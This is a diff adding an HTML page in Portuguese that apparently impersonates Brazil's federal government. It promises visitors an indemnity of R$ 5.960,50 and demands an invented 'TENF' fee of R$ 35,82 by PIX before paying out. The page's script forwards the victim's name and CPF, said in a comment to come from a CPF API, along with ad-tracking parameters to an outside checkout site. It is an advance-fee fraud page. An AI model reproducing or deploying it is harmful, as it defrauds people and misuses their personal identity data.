@@ -1,0 +1,90 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+        window.pixelId = "69c2c9cb38b93d76c6cf4e63";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+      
+      <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        async
+        defer
+      ></script>
+      
+      <!-- Meta Pixel Code -->
+      <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1694102791750073');
+      fbq('track', 'PageView');
+      </script>
+      <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1694102791750073&ev=PageView&noscript=1"
+      /></noscript>
+      <!-- End Meta Pixel Code --><script async="" defer="" src="js/pixel.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div style="width: 100%; text-align: center; margin: auto;">
+            <img src="images/ja1d2WHKLqed.png" alt="Governo Federal" class="logo" style="width: 100%; max-width: 130px;">
+        </div>
+        <div class="amount">
+            <div class="amount-label">Indenização disponível:</div>
+            <div class="amount-value">R$ 5.960,50</div>
+        </div>
+        <div class="tax-box">
+            <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
+            <div class="tax-box-value">R$ 35,82</div>
+        </div>
+        <button id="paymentButton" class="button" onclick="irParaCheckout()">Efetuar pagamento da Taxa</button>
+        <div id="loadingMessage">Gerando código PIX...</div>
+        
+        <div class="info-box">
+            Para receber o valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). Que
+            corresponde ao custo gerado por transferências de alto valor, após o pagamento será feito a transferência
+            imediata da sua indenização para sua chave pix cadastrada. Caso não conclua o pagamento dessa taxa, sua
+            indenização será bloqueada.
+        </div>
+    </div>
+    <script src="js/YaGYkk2Laswz.js"></script>
+    <script src="js/Om9CWrkCza0N.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+        function irParaCheckout() {
+            var p = new URLSearchParams(window.location.search);
+
+            var dest = new URLSearchParams();
+
+            // Dados pessoais vindos da API de CPF — aceita nome/cpf em qualquer formato
+            var nome = p.get('nome') || '';
+            var cpf  = p.get('cpf') || p.get('documento') || '';
+
+            if (nome) {
+                dest.set('nome', nome);
+                dest.set('documento', cpf); // checkout espera 'documento'
+                dest.set('cpf', cpf);       // mantém 'cpf' também por segurança
+            }
+
+            // Valor fixo desta taxa
+            dest.set('valor', '3582');
+
+            // Repassa UTMs e rastreamento
+            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
+                var v = p.get(k);
+                if (v) dest.set(k, v);
+            });
+
+            window.location.href = 'https://beneficiogov.vercel.app/checkout.html?' + dest.toString();
+        }
+    </script>
+</body></html>
